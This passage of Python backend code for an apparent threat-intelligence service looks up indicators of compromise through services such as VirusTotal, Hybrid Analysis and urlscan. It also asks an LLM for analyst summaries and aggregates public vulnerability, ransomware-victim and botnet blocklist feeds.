        families = sorted([{"name": f, "count": c} for f, c in fam_counts.items()], key=lambda x: x["count"], reverse=True)[:5]
        samples = []
        for x in results[:limit]:
            samples.append({
                "sha256": x.get("sha256"),
                "verdict": x.get("verdict"),
                "threat_score": x.get("threat_score"),
                "vx_family": x.get("vx_family"),
                "av_detect": x.get("av_detect"),
                "submit_name": x.get("submit_name"),
                "environment": x.get("environment_description") or x.get("environment_id"),
                "analysis_start_time": x.get("analysis_start_time"),
                "url": f"https://www.hybrid-analysis.com/sample/{x.get('sha256')}" if x.get("sha256") else None,
            })
        # Overall malicious count
        malicious = sum(1 for x in results if (x.get("verdict") or "").lower() == "malicious")
        return {
            "found": True,
            "count": j.get("count") or len(results),
            "malicious": malicious,
            "families": families,
            "samples": samples,
        }
    except Exception:
        return {"error": "request_failed"}


async def _ha_quick_scan_url(hc: httpx.AsyncClient, url_value: str, scan_type: str = "all") -> dict:
    """Submit a URL for shallow multi-scanner analysis. Returns normalized verdict."""
    if not HYBRID_ANALYSIS_API_KEY:
        return {"error": "not_configured"}
    try:
        r = await hc.post(
            f"{_HA_BASE}/quick-scan/url",
            data={"url": url_value, "scan_type": scan_type},
            headers={**_HA_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
            timeout=30,
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code >= 400:
            try:
                return {"error": "invalid_input", "detail": r.json()}
            except Exception:
                return {"error": "request_failed"}
        j = r.json() or {}
        scanners = j.get("scanners") or []
        # Normalize scanner rows.
        rows = []
        malicious_hits = 0
        for s in scanners:
            positives = s.get("positives")
            is_mal = (positives is not None and positives > 0)
            if is_mal:
                malicious_hits += 1
            rows.append({
                "name": s.get("name"),
                "status": s.get("status"),
                "positives": positives,
                "total": s.get("total"),
                "percent": s.get("percent"),
                "error_message": s.get("error_message"),
            })
        verdict = "malicious" if malicious_hits >= 2 else ("suspicious" if malicious_hits == 1 else "no threat")
        return {
            "id": j.get("id"),
            "sha256": j.get("sha256"),
            "submission_type": j.get("submission_type"),
            "verdict": verdict,
            "malicious_scanners": malicious_hits,
            "total_scanners": len(scanners),
            "scanners": rows,
            "reports_count": len(j.get("reports") or []),
            "report_url": f"https://www.hybrid-analysis.com/sample/{j['sha256']}" if j.get("sha256") else None,
        }
    except Exception as e:
        logger.warning(f"HA quick scan error: {e}")
        return {"error": "request_failed"}


class HaUrlInput(BaseModel):
    url: str
    scan_type: str = "all"


@api_router.post("/hybrid/quick-scan-url")
async def hybrid_quick_scan_url(payload: HaUrlInput):
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    url_value = (payload.url or "").strip()
    if not url_value or not url_value.lower().startswith(("http://", "https://")):
        raise HTTPException(status_code=422, detail="Provide a valid http(s) URL")
    async with httpx.AsyncClient(timeout=35, follow_redirects=True) as hc:
        result = await _ha_quick_scan_url(hc, url_value, payload.scan_type or "all")
    if result.get("error"):
        raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
    return result


class HaSearchInput(BaseModel):
    value: str
    limit: int = 15


@api_router.post("/hybrid/search-samples")
async def hybrid_search_samples(payload: HaSearchInput):
    """Return sandboxed samples on Hybrid Analysis that observed/contacted the
    given host, domain, IP or URL. Powers the 'Sandboxed samples that contacted
    this' enrichment panel in the IOC Analyzer."""
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    raw = (payload.value or "").strip()
    if not raw:
        raise HTTPException(status_code=422, detail="value is required")
    # Normalize + choose the right HA search term based on IOC kind.
    from urllib.parse import urlparse
    normalized = raw
    kind = _classify_ioc(raw)
    if kind == "url":
        # Extract host from URL for a broader match (HA "host" indexes samples that resolved/connected to that host).
        try:
            parsed = urlparse(raw)
            host = (parsed.hostname or "").strip()
        except Exception:
            host = ""
        if not host:
            raise HTTPException(status_code=422, detail="Invalid URL")
        params = {"host": host}
        normalized = host
        term = "host"
    elif kind == "ip":
        params = {"host": raw}
        term = "host"
    elif kind == "domain":
        params = {"domain": raw}
        term = "domain"
    else:
        raise HTTPException(status_code=422, detail="Only IP, domain or URL indicators are supported")

    limit = max(1, min(int(payload.limit or 15), 40))
    async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
        result = await _ha_search_terms(hc, params, limit=limit)
    if result is None:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    if result.get("error"):
        raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
    return {"queried": normalized, "term": term, **result}


class HaLookupInput(BaseModel):
    value: str
    limit: int = 12


@api_router.post("/hybrid/lookup")
async def hybrid_lookup(payload: HaLookupInput):
    """Universal Hybrid Analysis lookup — auto-classifies the input and routes to
    the right HA endpoint. Powers the on-page 'HA IOC Analyzer' so a single
    input box can handle URLs, file hashes, IPs and domains.

    Returns a unified envelope: {kind, value, result: {...}} where the shape of
    `result` depends on `kind`:
      - url:            {verdict, malicious_scanners, total_scanners, scanners[], report_url, reports_count}
      - sha256/sha1/md5:{found, verdict, threat_score, vx_family, classification[], reports, url, submitted_at}
      - ip / domain:    {count, malicious, families[], samples[]}
    """
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    raw = (payload.value or "").strip()
    if not raw:
        raise HTTPException(status_code=422, detail="value is required")

    kind = _classify_ioc(raw)
    async with httpx.AsyncClient(timeout=35, follow_redirects=True) as hc:
        if kind == "url":
            result = await _ha_quick_scan_url(hc, raw, "all")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": "url", "value": raw, "result": result}

        if kind in ("sha256", "sha1", "md5"):
            result = await _ha_hash_lookup(hc, raw)
            if not result:
                raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
            if result.get("skipped"):
                # HA overview only supports SHA256 — surface that clearly.
                raise HTTPException(status_code=422, detail=f"Hybrid Analysis /overview supports SHA256 only. You provided a {kind.upper()}. Provide the SHA256 (or run VT/URLScan via the OSINT analyzer above).")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": kind, "value": raw, "result": result}

        if kind in ("ip", "domain"):
            from urllib.parse import urlparse  # noqa: F401 (kept for symmetry / future)
            params = {"host": raw} if kind == "ip" else {"domain": raw}
            limit = max(1, min(int(payload.limit or 12), 40))
            result = await _ha_search_terms(hc, params, limit=limit)
            if result is None:
                raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": kind, "value": raw, "result": result}

        raise HTTPException(status_code=422, detail=f"Unsupported IOC type ({kind or 'unknown'}). Provide a URL, SHA256/SHA1/MD5 hash, IP address, or domain.")



def _vt_url_id(u: str) -> str:
    import base64
    return base64.urlsafe_b64encode(u.encode("utf-8")).decode("utf-8").strip("=")


async def _vt_lookup(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    if not VT_API_KEY:
        return None
    if kind == "ip":
        path = f"ip_addresses/{normalized}"
    elif kind == "domain":
        path = f"domains/{normalized}"
    elif kind == "url":
        path = f"urls/{_vt_url_id(normalized)}"
    else:
        path = f"files/{normalized}"
    try:
        r = await hc.get(f"https://www.virustotal.com/api/v3/{path}", headers={"x-apikey": VT_API_KEY, "accept": "application/json"})
        if r.status_code == 404:
            return {"found": False, "malicious": 0, "suspicious": 0, "harmless": 0, "undetected": 0, "total": 0, "reputation": None}
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        attrs = ((r.json() or {}).get("data") or {}).get("attributes") or {}
        stats = attrs.get("last_analysis_stats") or {}
        mal = stats.get("malicious", 0) or 0
        susp = stats.get("suspicious", 0) or 0
        harm = stats.get("harmless", 0) or 0
        undet = stats.get("undetected", 0) or 0
        total = mal + susp + harm + undet + (stats.get("timeout", 0) or 0)
        ptc = attrs.get("popular_threat_classification") or {}
        threat_categories = [c.get("value") for c in (ptc.get("popular_threat_category") or []) if c.get("value")]
        return {
            "found": True,
            "malicious": mal,
            "suspicious": susp,
            "harmless": harm,
            "undetected": undet,
            "total": total,
            "reputation": attrs.get("reputation"),
            "label": attrs.get("meaningful_name") or attrs.get("type_description"),
            "last_analysis_date": attrs.get("last_analysis_date"),
            "threat_label": ptc.get("suggested_threat_label"),
            "threat_categories": threat_categories[:6],
            "tags": (attrs.get("tags") or [])[:10],
        }
    except Exception:
        return {"error": "request_failed"}


async def _abuseipdb_lookup(hc: httpx.AsyncClient, normalized: str) -> Optional[dict]:
    if not ABUSEIPDB_API_KEY:
        return None
    try:
        r = await hc.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            params={"ipAddress": normalized, "maxAgeInDays": "90"},
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        d = (r.json() or {}).get("data") or {}
        return {
            "score": d.get("abuseConfidenceScore"),
            "reports": d.get("totalReports"),
            "country": d.get("countryCode"),
            "isp": d.get("isp"),
            "domain": d.get("domain"),
            "whitelisted": d.get("isWhitelisted"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _reputation(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    """VT + AbuseIPDB + Hybrid Analysis + MalwareBazaar reputation with 6h Mongo cache.
    Also runs Hybrid Analysis URL quick-scan for URL inputs. Returns None when no keys set."""
    if not (VT_API_KEY or ABUSEIPDB_API_KEY or HYBRID_ANALYSIS_API_KEY or MALWAREBAZAAR_API_KEY):
        return None
    cache_key = f"{kind}:{normalized}"
    try:
        doc = await db.ioc_cache.find_one({"_id": cache_key})
        if doc and doc.get("ts"):
            if datetime.now(timezone.utc) - datetime.fromisoformat(doc["ts"]) < _REP_TTL:
                return doc.get("reputation")
    except Exception:
        pass
    rep = {"vt": await _vt_lookup(hc, kind, normalized), "abuseipdb": None, "hybrid_analysis": None, "malwarebazaar": None}
    if kind == "ip":
        rep["abuseipdb"] = await _abuseipdb_lookup(hc, normalized)
    if kind in ("md5", "sha1", "sha256"):
        # Run HA (sha256 only) + MalwareBazaar (all three hash types) in parallel.
        ha_task = _ha_hash_lookup(hc, normalized)
        mb_task = _mb_hash_lookup(hc, normalized)
        ha, mb = await asyncio.gather(ha_task, mb_task)
        rep["hybrid_analysis"] = ha
        rep["malwarebazaar"] = mb
    if kind == "url":
        # Fold HA URL quick-scan into the unified analyzer for URL inputs.
        try:
            rep["hybrid_analysis"] = await _ha_quick_scan_url(hc, normalized, "all")
        except Exception as e:
            logger.warning(f"HA quick-scan failed for {normalized}: {e}")
    try:
        await db.ioc_cache.update_one({"_id": cache_key}, {"$set": {"reputation": rep, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return rep


async def _shodan_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await hc.get(f"https://internetdb.shodan.io/{ip}")
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


async def _geo_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await hc.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,as,query")
        j = r.json()
        return j if j.get("status") == "success" else {}
    except Exception:
        return {}


async def _resolve_host(hc: httpx.AsyncClient, host: str) -> Optional[str]:
    """Resolve a hostname's first A record via Google DNS-over-HTTPS (no key)."""
    try:
        r = await hc.get(f"https://dns.google/resolve?name={host}&type=A", headers={"Accept": "application/json"})
        if r.status_code == 200:
            for ans in (r.json() or {}).get("Answer", []):
                if ans.get("type") == 1 and ans.get("data"):
                    return ans["data"]
    except Exception:
        pass
    return None


async def _do_lookup(hc: httpx.AsyncClient, value: str) -> dict:
    """Full IOC lookup: classify + free enrichment + optional key-based reputation."""
    value = (value or "").strip()
    kind = _classify_ioc(value)
    if kind == "unknown":
        return {"value": value, "type": "unknown", "links": {}, "enrichment": None, "reputation": None, "local_db": None}
    normalized = value.replace("[.]", ".")
    result = {"value": value, "type": kind, "links": _ioc_links(value, kind), "enrichment": None, "reputation": None, "local_db": None}

    try:
        local = await db.iocs.find_one({"key": _ioc_key(value)}, {"_id": 0})
        if local:
            result["local_db"] = {
                "threat_name": local.get("threat_name"),
                "severity": local.get("severity"),
                "tags": local.get("tags", []),
                "source": local.get("source"),
                "notes": local.get("notes"),
                "created_at": local.get("created_at"),
            }
    except Exception:
        pass

    try:
        if kind == "ip":
            sh, gj = await asyncio.gather(_shodan_ip(hc, normalized), _geo_ip(hc, normalized))
            result["enrichment"] = {
                "kind": "ip",
                "geo": {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None,
                "open_ports": sh.get("ports", []),
                "hostnames": sh.get("hostnames", []),
                "tags": sh.get("tags", []),
                "vulns": sh.get("vulns", []),
                "sources": ["Shodan InternetDB", "ip-api.com"],
            }
        elif kind in ("domain", "url"):
            from urllib.parse import urlparse
            parsed = urlparse(normalized) if kind == "url" else None
            host = ((parsed.netloc if parsed else normalized).split(":")[0]) if (parsed or normalized) else ""
            # Full requested URL (only for URL inputs).
            requested_url = normalized if kind == "url" else None

            def _norm_url(u: str) -> str:
                return (u or "").rstrip("/").lower()

            # urlscan search always keys on domain for broad recall; ranking below picks the
            # scan whose page matches the requested URL first, then falls back to path prefix,
            # then any scan for the host. Homepage is only a last-resort fallback.

            async def urlscan():
                try:
                    headers = {"API-Key": URLSCAN_API_KEY} if URLSCAN_API_KEY else {}

                    def _norm_host(u: str) -> str:
                        try:
                            from urllib.parse import urlparse as _up
                            h = (_up(u).netloc or "").lower().split(":")[0]
                            return h[4:] if h.startswith("www.") else h
                        except Exception:
                            return ""

                    target_host = (host[4:] if host.startswith("www.") else host).lower()

                    all_results: list[dict] = []
                    scan_count = 0

                    # Step 1 — for URL inputs, try an exact URL match first.
                    if requested_url:
                        exact_q = f'page.url:"{requested_url}"'
                        r1 = await hc.get(f"https://urlscan.io/api/v1/search/?q={exact_q}&size=5", headers=headers)
                        if r1.status_code == 200:
                            j1 = r1.json()
                            # Even the "exact" search can return unrelated tokenized matches — filter by host.
                            for x in (j1.get("results", []) or []):
                                if _norm_host(x.get("task", {}).get("url", "")) == target_host:
                                    all_results.append(x)
                            scan_count = j1.get("total", 0) or scan_count

                    # Step 2 — quoted-domain search + strict host filter (defends against urlscan's
                    # loose token matching that used to return unrelated scans containing the host token).
                    if host:
                        dq = f'page.domain:"{host}"'
                        r2 = await hc.get(f"https://urlscan.io/api/v1/search/?q={dq}&size=25", headers=headers)
                        if r2.status_code == 200:
                            j2 = r2.json()
                            filtered = [x for x in (j2.get("results", []) or []) if _norm_host(x.get("task", {}).get("url", "")) == target_host]
                            existing_ids = {x.get("_id") for x in all_results}
                            for x in filtered:
                                if x.get("_id") not in existing_ids:
                                    all_results.append(x)
                            scan_count = scan_count or j2.get("total", 0) or 0

                    recent = [{"url": x["task"]["url"], "date": x["task"].get("time"), "score": x.get("verdicts", {}).get("overall", {}).get("score"), "screenshot": x.get("screenshot")} for x in all_results[:5]]

                    def _is_home(u: str) -> bool:
                        n = _norm_url(u)
                        return n in (f"http://{host}", f"https://{host}", f"http://www.{host}", f"https://www.{host}")

                    def _rank(x: dict) -> int:
                        u = _norm_url(x.get("task", {}).get("url", ""))
                        if not x.get("screenshot"):
                            return 99
                        if requested_url:
                            req = _norm_url(requested_url)
                            if u == req:
                                return 0
                            # If the user typed a homepage URL, prefer the homepage.
                            if _is_home(req):
                                return 0 if _is_home(u) else 3
                            if req and u.startswith(req + "/"):
                                return 1
                            if req.startswith(u + "/") and not _is_home(u):
                                return 2
                            if not _is_home(u):
                                return 3
                            return 5
                        return 0 if _is_home(u) else 3

                    ranked = sorted(all_results, key=_rank)
                    preview = None
                    for x in ranked:
                        if x.get("screenshot"):
                            preview = {"screenshot": x["screenshot"], "url": x.get("task", {}).get("url"), "result": x.get("result")}
                            break
                    return {"scan_count": scan_count, "recent_scans": recent, "preview": preview}
                except Exception:
                    return {"scan_count": 0, "recent_scans": [], "preview": None}

            us, resolved = await asyncio.gather(urlscan(), _resolve_host(hc, host))
            sources = ["Google DNS", "urlscan.io"]
            enr = {
                "kind": "web",
                "host": host,
                "resolved_ip": resolved,
                "geo": None,
                "open_ports": [],
                "hostnames": [],
                "vulns": [],
                "scan_count": us["scan_count"],
                "recent_scans": us["recent_scans"],
                "preview": us.get("preview"),
                "sources": sources,
            }
            if resolved:
                sh, gj = await asyncio.gather(_shodan_ip(hc, resolved), _geo_ip(hc, resolved))
                enr["geo"] = {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None
                enr["open_ports"] = sh.get("ports", [])
                enr["hostnames"] = sh.get("hostnames", [])
                enr["vulns"] = sh.get("vulns", [])
                enr["sources"] = ["Google DNS", "Shodan InternetDB", "ip-api.com", "urlscan.io"]
            result["enrichment"] = enr
        else:
            # File hash — key-free lookup against CIRCL hashlookup (known-file DB)
            enr = {
                "kind": "hash",
                "hash_type": kind,
                "found": False,
                "known_malicious": False,
                "filename": None,
                "filesize": None,
                "product": None,
                "source_label": None,
                "note": "Not found in the CIRCL known-file database. Use the deep links below to check reputation on VirusTotal, MalwareBazaar and others.",
                "sources": ["CIRCL hashlookup"],
            }
            try:
                r = await hc.get(f"https://hashlookup.circl.lu/lookup/{kind}/{normalized}", headers={"Accept": "application/json"})
                if r.status_code == 200:
                    j = r.json()
                    if isinstance(j, dict) and not j.get("message"):
                        enr["found"] = True
                        enr["known_malicious"] = bool(j.get("KnownMalicious"))
                        enr["filename"] = j.get("FileName")
                        enr["filesize"] = j.get("FileSize")
                        enr["product"] = (j.get("ProductCode") or {}).get("ProductName") if isinstance(j.get("ProductCode"), dict) else None
                        enr["source_label"] = j.get("KnownMalicious") or ("NSRL known-good file" if j.get("RDS:package_id") else "Known file")
                        enr["note"] = None
            except Exception:
                pass
            result["enrichment"] = enr
    except Exception as e:
        logger.error(f"IOC enrichment error: {e}")

    try:
        result["reputation"] = await _reputation(hc, kind, normalized)
    except Exception as e:
        logger.error(f"IOC reputation error: {e}")

    return result


@api_router.get("/ioc-config")
async def ioc_config():
    """Tells the frontend which key-based reputation providers are active."""
    return {
        "vt_enabled": bool(VT_API_KEY),
        "abuseipdb_enabled": bool(ABUSEIPDB_API_KEY),
        "hybrid_analysis_enabled": bool(HYBRID_ANALYSIS_API_KEY),
        "malwarebazaar_enabled": bool(MALWAREBAZAAR_API_KEY),
    }


@api_router.get("/ioc-lookup")
async def ioc_lookup(value: str):
    value = (value or "").strip()
    if not value or len(value) > 2048:
        raise HTTPException(status_code=400, detail="Provide a valid IOC (hash, IP, domain or URL)")
    if _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Could not recognize this as a hash, IP, domain or URL")
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        return await _do_lookup(hc, value)


class BatchIOCInput(BaseModel):
    values: List[str] = Field(default_factory=list)


@api_router.post("/ioc-lookup-batch")
async def ioc_lookup_batch(payload: BatchIOCInput):
    # Accept a list of raw entries; split each on whitespace/comma/semicolon/newline.
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            tok = tok.strip()
            if tok:
                tokens.append(tok)
    # Dedupe (case-insensitive) preserving order, cap at 50.
    seen = set()
    items: List[str] = []
    for t in tokens:
        key = t.lower()
        if key not in seen:
            seen.add(key)
            items.append(t)
    if not items:
        raise HTTPException(status_code=400, detail="Provide at least one IOC to analyze")
    if len(items) > 50:
        items = items[:50]

    sem = asyncio.Semaphore(8)
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        async def one(v: str) -> dict:
            async with sem:
                try:
                    return await _do_lookup(hc, v)
                except Exception:
                    return {"value": v, "type": "unknown", "links": {}, "enrichment": None, "reputation": None}
        results = await asyncio.gather(*[one(v) for v in items])

    return {"count": len(results), "results": results}


class AiSummaryInput(BaseModel):
    value: str


_AI_TTL = timedelta(days=7)
_AI_SYSTEM = (
    "You are a senior threat-intelligence analyst at a cybersecurity firm. "
    "Given an indicator of compromise (IOC) and its OSINT enrichment data, write a concise, factual "
    "threat assessment for a SOC analyst. Cover: what the indicator is, an overall risk verdict, the most "
    "notable context (reputation scores, geo, open ports, malware family/tags, whether it is in the internal "
    "database), and one clear recommended action. 4-6 sentences, plain prose, no markdown headings or bullet "
    "lists. Only use facts present in the provided data — never fabricate detections, names or attribution."
)


@api_router.get("/ai-config")
async def ai_config():
    return {"ai_enabled": bool(EMERGENT_LLM_KEY)}


@api_router.post("/ioc-ai-summary")
async def ioc_ai_summary(payload: AiSummaryInput):
    if not EMERGENT_LLM_KEY:
        raise HTTPException(status_code=503, detail="AI analysis is not configured")
    value = (payload.value or "").strip()
    if not value or _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Provide a valid IOC (hash, IP, domain or URL)")

    ck = _ioc_key(value)
    try:
        cached = await db.ioc_ai_cache.find_one({"_id": ck})
        if cached and cached.get("ts") and datetime.now(timezone.utc) - datetime.fromisoformat(cached["ts"]) < _AI_TTL:
            return {"summary": cached["summary"], "cached": True}
    except Exception:
        pass

    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        result = await _do_lookup(hc, value)

    en = result.get("enrichment") or {}
    ctx: dict = {"type": result.get("type"), "reputation": result.get("reputation"), "in_internal_database": result.get("local_db")}
    if en.get("kind") == "ip":
        ctx.update({"geo": en.get("geo"), "open_ports": en.get("open_ports"), "known_vulns": en.get("vulns"), "tags": en.get("tags")})
    elif en.get("kind") == "web":
        ctx.update({"resolved_ip": en.get("resolved_ip"), "geo": en.get("geo"), "open_ports": en.get("open_ports"), "urlscan_scan_count": en.get("scan_count"), "known_vulns": en.get("vulns")})
    elif en.get("kind") == "hash":
        ctx.update({"in_known_file_db": en.get("found"), "known_malicious": en.get("known_malicious"), "filename": en.get("filename")})

    prompt = f"IOC: {value}\nEnrichment data (JSON):\n{json.dumps(ctx, default=str)[:6000]}"

    try:
        from emergentintegrations.llm.chat import LlmChat, UserMessage
        chat = LlmChat(api_key=EMERGENT_LLM_KEY, session_id=f"ioc-{ck}", system_message=_AI_SYSTEM).with_model("gemini", "gemini-3-flash-preview")
        resp = await chat.send_message(UserMessage(text=prompt))
        summary = resp if isinstance(resp, str) else str(resp)
        summary = summary.strip()
    except Exception as e:
        logger.error(f"AI summary error: {e}")
        raise HTTPException(status_code=502, detail="AI analysis failed. Please try again.")

    try:
        await db.ioc_ai_cache.update_one({"_id": ck}, {"$set": {"summary": summary, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return {"summary": summary, "cached": False}


@api_router.get("/live-feed")
async def live_feed():
    now = datetime.now(timezone.utc)
    if _feed_cache["data"] and _feed_cache["ts"] and (now - _feed_cache["ts"]) < timedelta(minutes=5):
        return _feed_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15) as hc:
            r = await hc.get(CISA_FEED_URL)
            r.raise_for_status()
            raw = r.json()
        vulns = raw.get("vulnerabilities", [])
        vulns_sorted = sorted(vulns, key=lambda v: v.get("dateAdded", ""), reverse=True)
        recent = [
            {
                "cve": v.get("cveID"),
                "vendor": v.get("vendorProject"),
                "product": v.get("product"),
                "name": v.get("vulnerabilityName"),
                "dateAdded": v.get("dateAdded"),
                "action": v.get("requiredAction"),
                "ransomware": v.get("knownRansomwareCampaignUse", "Unknown"),
                "nvd_url": f"https://nvd.nist.gov/vuln/detail/{v.get('cveID')}",
                "detail_url": f"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext={v.get('cveID')}",
            }
            for v in vulns_sorted
        ]
        result = {
            "source": "CISA Known Exploited Vulnerabilities",
            "catalog_version": raw.get("catalogVersion"),
            "total_count": raw.get("count", len(vulns)),
            "ransomware_linked": sum(1 for v in vulns if v.get("knownRansomwareCampaignUse") == "Known"),
            "updated": now.isoformat(),
            "returned": len(recent),
            "items": recent,
        }
        _feed_cache["data"] = result
        _feed_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Live feed error: {e}")
        if _feed_cache["data"]:
            return _feed_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live threat feed")


_attack_cache: dict[str, Any] = {"ts": None, "data": None}


@api_router.get("/attack-feed")
async def attack_feed():
    """Real-time attack feed: recent ransomware victims from ransomware.live (cached 20 min)."""
    now = datetime.now(timezone.utc)
    if _attack_cache["data"] and _attack_cache["ts"] and (now - _attack_cache["ts"]) < timedelta(minutes=5):
        return _attack_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as hc:
            r = await hc.get("https://api.ransomware.live/v2/recentvictims")
            r.raise_for_status()
            raw = r.json()
        items = []
        for v in raw[:200]:  # ransomware.live returns ~100 items; keep 200 as safety cap
            items.append({
                "victim": v.get("victim"),
                "group": v.get("group"),
                "country": v.get("country"),
                "sector": v.get("activity") if v.get("activity") not in (None, "Not Found") else None,
                "domain": v.get("domain"),
                "date": v.get("attackdate") or v.get("discovered"),
                "screenshot": v.get("screenshot"),
                "url": v.get("url"),
            })
        result = {
            "source": "ransomware.live · Recent Victims",
            "updated": now.isoformat(),
            "count": len(items),
            "items": items,
        }
        _attack_cache["data"] = result
        _attack_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Attack feed error: {e}")
        if _attack_cache["data"]:
            return _attack_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live attack feed")


# ---------------------------------------------------------------------------
# Live global attacks aggregate — merges public honeypot + malware-distribution
# feeds (SANS DShield top attackers, URLhaus recent malware URLs, Feodo Tracker
# botnet C2s) into a single "who's attacking the internet right now" payload.
# All feeds are public / free / no key required. Cached 5 min.
# ---------------------------------------------------------------------------
_live_attacks_cache: dict[str, Any] = {"ts": None, "data": None}


@api_router.get("/live-attacks")
async def live_attacks():
    """Real-time global attack telemetry from public honeypot + malware feeds:
    SANS DShield (top attacker IPs), URLhaus (live malware URLs), Feodo Tracker
    (botnet C2s). Cached 5 min, source-attributed, no proprietary data."""
    now = datetime.now(timezone.utc)
    if _live_attacks_cache["data"] and _live_attacks_cache["ts"] and (now - _live_attacks_cache["ts"]) < timedelta(minutes=5):
        return _live_attacks_cache["data"]

    attackers: list[dict] = []
    malicious_urls: list[dict] = []
    botnet_c2s: list[dict] = []
    errors: list[str] = []

    async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": "NivX-ThreatMap/1.0"}) as hc:
        # 1) SANS DShield top attacker IPs (last 24h)
        try:
            r = await hc.get("https://isc.sans.edu/api/topips/records/50/?json")
            if r.status_code == 200:
                for it in (r.json() or [])[:50]:
                    if not it.get("source"):
                        continue
                    attackers.append({
                        "rank": it.get("rank"),
                        "ip": it.get("source"),
                        "reports": int(it.get("reports") or 0),
                        "targets": int(it.get("targets") or 0),
                        "source_name": "SANS Internet Storm Center · DShield",
                    })
            else:
                errors.append(f"DShield HTTP {r.status_code}")
        except Exception as e:
            errors.append(f"DShield: {e}")

        # 2) URLhaus recent malware distribution URLs
        try:
            r = await hc.get("https://urlhaus.abuse.ch/downloads/json_recent/")
            if r.status_code == 200:
                raw = r.json() or {}
                iterable = raw.values() if isinstance(raw, dict) else raw
                for entry in list(iterable)[:80]:
                    e = entry[0] if isinstance(entry, list) else entry
                    if not e or not e.get("url"):
                        continue
                    malicious_urls.append({
                        "url": e.get("url"),
                        "threat": e.get("threat") or "malware_download",
                        "status": e.get("url_status") or "online",
                        "tags": (e.get("tags") or [])[:5],
                        "reporter": e.get("reporter") or "urlhaus",
                        "first_seen": e.get("dateadded"),
                        "urlhaus_link": e.get("urlhaus_link"),
                        "source_name": "URLhaus (abuse.ch)",
                    })
            else:
                errors.append(f"URLhaus HTTP {r.status_code}")
        except Exception as e:
            errors.append(f"URLhaus: {e}")

        # 3) Feodo Tracker aggressive botnet C2 IPs
        try:
            r = await hc.get("https://feodotracker.abuse.ch/downloads/ipblocklist_aggressive.txt")
            if r.status_code == 200:
                for line in r.text.splitlines()[:100]:
                    s = line.strip()
                    if not s or s.startswith("#"):
                        continue
                    if _classify_ioc(s) == "ip":
                        botnet_c2s.append({"ip": s, "source_name": "Feodo Tracker (abuse.ch)"})
            else:
                errors.append(f"Feodo HTTP {r.status_code}")
        except Exception as e:
            errors.append(f"Feodo: {e}")

    result = {
        "updated_at": now.isoformat(),
        "sources": [
            {"name": "SANS DShield", "url": "https://isc.sans.edu/", "count": len(attackers)},
            {"name": "URLhaus (abuse.ch)", "url": "https://urlhaus.abuse.ch/", "count": len(malicious_urls)},
            {"name": "Feodo Tracker (abuse.ch)", "url": "https://feodotracker.abuse.ch/", "count": len(botnet_c2s)},
        ],
        "attackers": attackers,
        "malicious_urls": malicious_urls,
        "botnet_c2s": botnet_c2s[:50],
        "counts": {"attackers": len(attackers), "malicious_urls": len(malicious_urls), "botnet_c2s": len(botnet_c2s)},
        "errors": errors,
    }
    _live_attacks_cache["data"] = result
    _live_attacks_cache["ts"] = now
    return result


# ---------------------------------------------------------------------------
# Real-time Threat Landscape aggregate — powers the "Threat landscape, right now"
# dashboard on the marketing landing. Aggregates fresh CISA KEV + ransomware.live
# + the curated IOC DB + last-sync timestamps into a single payload that the
# frontend polls every 30 seconds.
# ---------------------------------------------------------------------------
